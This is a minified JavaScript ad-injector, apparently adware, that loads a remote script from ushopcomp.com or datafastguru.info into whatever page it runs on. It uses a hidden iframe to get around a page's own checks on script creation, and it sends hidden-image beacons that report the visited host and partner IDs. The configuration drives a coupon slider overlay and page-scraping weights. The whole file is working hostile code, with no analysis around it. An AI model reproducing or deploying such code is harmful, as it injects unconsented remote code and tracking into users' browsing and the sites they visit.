window.FO_DOMAIN = ".ushopcomp.com";
var Injector=function(){function e(){}return e.getAltDocument=function(){if(null==e.altDocument){var t=document.createElement("iframe");t.height=t.width="0",document.body.appendChild(t),e.altDocument=t.contentWindow.document}return e.altDocument},e.injectScript=function(t,n,o){var a=null,r=!0,i=!1,d=document.createElement;d.toString().indexOf("[native code]")>0?a=document.createElement("script"):(a=e.getAltDocument().createElement.call(document,"script"),r=!1),a.onload=a.onreadystatechange=function(){i||a.readyState&&"loaded"!==a.readyState&&"complete"!==a.readyState||(i=!0,a.parentNode.removeChild(a),n&&n())},a.onerror=function(e){i||(i=!0,o&&o(e))};var c=document.getElementsByTagName("head")[0],l=c.appendChild;return l.toString().indexOf("[native code]")>0?c.appendChild(a):(e.getAltDocument().appendChild.call(c,a),r=!1),a.src=t,r},e.altDocument=null,e}(),BootstrapHelper=function(){function e(){}return e.bootstrap=function(t,n,o){void 0===o&&(o=[]),o&&o.length||(o=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var a=e.selectDomain(o);e.notify(a,t,"inj",{},.01);var r="//pstatic"+a+"/nwp/v0_0_397/release/Shared/SharedApp.js",i="FO.Shared_"+n+".SharedApp",d=Injector.injectScript(r,function(){var n=e.instantiateClass(i);n.init(t,a)},function(){e.notify(a,t,"exception",{ex:"Failure to get SharedApp"},.01)});window.setTimeout(function(){var n=void 0==window.FO;n&&e.notify(a,t,"generic",{subtype:"badinj",nativeinj:""+d},.01)},3e3)},e.notify=function(e,t,n,o,a){n+"_rate"in t.overrides&&(a=parseFloat(t.overrides[n+"_rate"]));var r=Math.random()<a;if(r){var i="//app"+e+"/a/"+n+"/logo.png?fam=nwp",d={};d.t=(new Date).getTime()+"",d.v="0_0_397",d.dmn=e,d.partid=t.partnerCode,d.subid=t.subId,d.hn=document.location.host;for(var c in d)i+="&"+c+"="+encodeURIComponent(d[c]);for(var c in o)i+="&"+c+"="+encodeURIComponent(o[c]);var l=document.body.appendChild(document.createElement("img"));l.style.zIndex="-100",l.style.position="absolute",l.style.left="0",l.style.top="0",l.src=i}},e.selectDomain=function(e){for(var t=[],n=0;n<e.length;n++)e[n]&&e[n].length&&-1==e[n].indexOf("$")&&t.push(e[n]);var n=Math.floor(Math.random()*t.length);return t[n]},e.instantiateClass=function(e){for(var t=e.split("."),n=window,o=0;o<t.length;o++)n=n[t[o]];var a=new n;return a},e}(),params={"products":{"DualRightSlider":[{"logic":["CommerceDealsLogic","CouponsLogic"],"visual":"DualRightSliderVisual","weight":10}]},modules:{},partnerCode:"king",subId:"4030017",providerName:"Positive Finds",providerLink:"",overrides:{inj_rate:"0.01",exception_rate:"1",noshow_rate:"0.01",init_rate:"0.01",usr_rate:"0.1"},flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"1"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"1"},{"name":"notifyrate.noshow","val":"0.01"}]}]},{"name":"ScrollingSlider","flag":"guy_scroll4","variants":[{"name":"AutoShort","flagValue":"auto-s","odds":0.5,"values":[{"name":"rightslider.use-scroller","val":"1"},{"name":"rightslider.scroll-sync","val":"1"},{"name":"rightslider.scroll-auto","val":"2000"},{"name":"rightslider.scroll-independent","val":"1"},{"name":"rightslider.scroll-peekaboo","val":"0"}]},{"name":"AutoLong","flagValue":"auto-l","odds":0.5,"values":[{"name":"rightslider.use-scroller","val":"1"},{"name":"rightslider.scroll-sync","val":"1"},{"name":"rightslider.scroll-auto","val":"4000"},{"name":"rightslider.scroll-independent","val":"1"},{"name":"rightslider.scroll-peekaboo","val":"0"}]}]},{"name":"ScrapeWeights","flag":"rubi_sw4","variants":[{"name":"Standard","flagValue":"std","odds":0,"values":[{"name":"deal-scrape-weights.title","val":"6"},{"name":"deal-scrape-weights.ribbon","val":"10"},{"name":"deal-scrape-weights.search","val":"8"},{"name":"deal-scrape-weights.h1","val":"6"},{"name":"deal-scrape-weights.text","val":"1"},{"name":"deal-scrape-weights.importantqs","val":"20"},{"name":"deal-scrape-weights.otherqs","val":"1"}]},{"name":"Experiment1","flagValue":"e1","odds":0.33333,"values":[{"name":"deal-scrape-weights.title","val":"10"},{"name":"deal-scrape-weights.ribbon","val":"6"},{"name":"deal-scrape-weights.search","val":"15"},{"name":"deal-scrape-weights.h1","val":"8"},{"name":"deal-scrape-weights.text","val":"1"},{"name":"deal-scrape-weights.importantqs","val":"20"},{"name":"deal-scrape-weights.otherqs","val":"1"}]},{"name":"Experiment2","flagValue":"e2","odds":0.33333,"values":[{"name":"deal-scrape-weights.title","val":"20"},{"name":"deal-scrape-weights.ribbon","val":"5"},{"name":"deal-scrape-weights.search","val":"100"},{"name":"deal-scrape-weights.h1","val":"6"},{"name":"deal-scrape-weights.text","val":"0"},{"name":"deal-scrape-weights.importantqs","val":"20"},{"name":"deal-scrape-weights.otherqs","val":"1"}]},{"name":"Experiment3","flagValue":"e3","odds":0.33333,"values":[{"name":"deal-scrape-weights.title","val":"15"},{"name":"deal-scrape-weights.ribbon","val":"20"},{"name":"deal-scrape-weights.search","val":"20"},{"name":"deal-scrape-weights.h1","val":"6"},{"name":"deal-scrape-weights.text","val":"0"},{"name":"deal-scrape-weights.importantqs","val":"20"},{"name":"deal-scrape-weights.otherqs","val":"0"}]}]},{"name":"Scrapping","flag":"ab_jenia_use_scrap","variants":[{"name":"UseScrapping","flagValue":"1","odds":0,"values":[{"name":"scrapping.use","val":"1"}]},{"name":"DontUseScrapping","flagValue":"0","odds":1,"values":[{"name":"scrapping.use","val":"0"}]}]},{"name":"RibbonFirstImage","flag":"ab_rafi_rb_first_img","variants":[{"name":"RibbonShowOnFirst","flagValue":"1","odds":0.3,"values":[{"name":"ribbon.show-on-first-img","val":"1"}]},{"name":"RibbonShowOnSec","flagValue":"0","odds":0.7,"values":[{"name":"ribbon.show-on-first-img","val":"0"}]}]},{"name":"UseLargestImg","flag":"ab_rafi_use_largest_img","variants":[{"name":"UseLargestImgPrice","flagValue":"1","odds":0.5,"values":[{"name":"use-largest-img-price","val":"1"}]},{"name":"DontUseLargestImgPrice","flagValue":"0","odds":0.5,"values":[{"name":"use-largest-img-price","val":"0"}]}]},{"name":"IgnoreOnlyNumbers","flag":"ab_rafi_ignore_only_numbers","variants":[{"name":"IgnoreOnlyNumbersQuery","flagValue":"1","odds":1,"values":[{"name":"api.ignore-only-numbers","val":"1"}]},{"name":"SendOnlyNumbersQuery","flagValue":"0","odds":0,"values":[{"name":"api.ignore-only-numbers","val":"0"}]}]},{"name":"IgnoreLessThanTwo","flag":"ab_rafi_ignore_less_two","variants":[{"name":"IgnoreLessThanTwoQuery","flagValue":"1","odds":1,"values":[{"name":"api.ignore-less-than-two-words","val":"1"}]},{"name":"SendLessThanTwoQuery","flagValue":"0","odds":0,"values":[{"name":"api.ignore-less-than-two-words","val":"0"}]}]},{"name":"KwcFix","flag":"ab_rafi_kwc_fix","variants":[{"name":"UseKwcFix","flagValue":"1","odds":1,"values":[{"name":"api.fixed-kwc-t","val":"1"}]},{"name":"DontUseKwcFix","flagValue":"0","odds":0,"values":[{"name":"api.fixed-kwc-t","val":"0"}]}]},{"name":"NewGetImage","flag":"ab_rafi_new_get_img","variants":[{"name":"UseNewGetImg","flagValue":"1","odds":1,"values":[{"name":"deals-logic.use-new-get-img","val":"1"}]},{"name":"DontUseNewGetImg","flagValue":"0","odds":0,"values":[{"name":"deals-logic.use-new-get-img","val":"0"}]}]},{"name":"FilterEmptyWords","flag":"ab_rafi_filter_empty_words","variants":[{"name":"FilterEmptyWords","flagValue":"1","odds":1,"values":[{"name":"deals-logic.filter-empty-words","val":"1"}]},{"name":"FilterNonWords","flagValue":"0","odds":0,"values":[{"name":"deals-logic.filter-empty-words","val":"0"}]}]},{"name":"OffersApiPruning","flag":"oap","variants":[{"name":"Off","flagValue":"off","odds":0.8,"values":[{"name":"offersapi.prune","val":"0"}]},{"name":"TopHalf","flagValue":"top","odds":0.1,"values":[{"name":"offersapi.prune","val":"1"}]},{"name":"OverMedian","flagValue":"med","odds":0.1,"values":[{"name":"offersapi.prune","val":"2"}]}]}]},specific:{"value":[]}}},version="0_0_397";BootstrapHelper.bootstrap(params,version);